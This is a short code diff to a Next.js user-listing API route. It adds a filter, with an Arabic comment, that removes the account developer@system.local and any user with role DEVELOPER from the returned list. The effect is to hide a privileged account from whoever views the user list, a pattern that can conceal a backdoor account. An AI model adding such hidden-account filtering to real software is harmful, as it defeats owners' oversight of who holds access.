@@ -33,8 +33,14 @@ export async function GET(request: NextRequest) {
         createdAt: 'desc'
       }
     })
+    
+    // فلترة المطور من النتائج (بالبريد الإلكتروني والدور)
+    const filteredUsers = users.filter(user => 
+      user.email !== 'developer@system.local' && 
+      user.role !== 'DEVELOPER' as any
+    )
 
-    return NextResponse.json({ users })
+    return NextResponse.json({ users: filteredUsers })
   } catch (error) {
     console.error('Error fetching users:', error)
     return NextResponse.json({ error: 'Internal server error' }, { status: 500 })
